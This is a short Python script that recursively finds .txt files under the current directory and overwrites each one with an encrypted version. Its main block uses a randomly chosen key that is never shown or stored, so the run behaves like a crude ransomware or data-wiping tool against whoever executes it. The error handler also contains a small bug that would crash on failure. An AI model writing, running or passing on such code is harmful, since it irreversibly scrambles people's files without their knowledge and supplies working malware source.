#!/usr/bin/python
import tempfile
import os, sys, random
from pathlib import *
from encrypt import encrypt_line
from decrypt import decrypt_line

def walk(input_path, key, action):
    p = Path(input_path)
    if (p.exists()):
        for file in p.rglob('*.txt'):
            if (os.access(file, os.W_OK) and os.access(file, os.R_OK)):
                try:
                    t = tempfile.NamedTemporaryFile(mode="r+")

                    with open(file, mode='r') as f:
                        for line in f:
                            if (action):
                                new_line = encrypt_line(line, key)
                            else:
                                new_line = decrypt_line(line, key)
                            t.write(new_line)

                    t.seek(0)

                    with open(file, mode='w') as f:
                        for line in t:
                            f.write(line)

                    t.close()
                except IOError as e:
                    print(str(file) + ": raises exception\n" + e)

if __name__ == "__main__":
    key = random.randint(0,127)
    walk('.', key, True)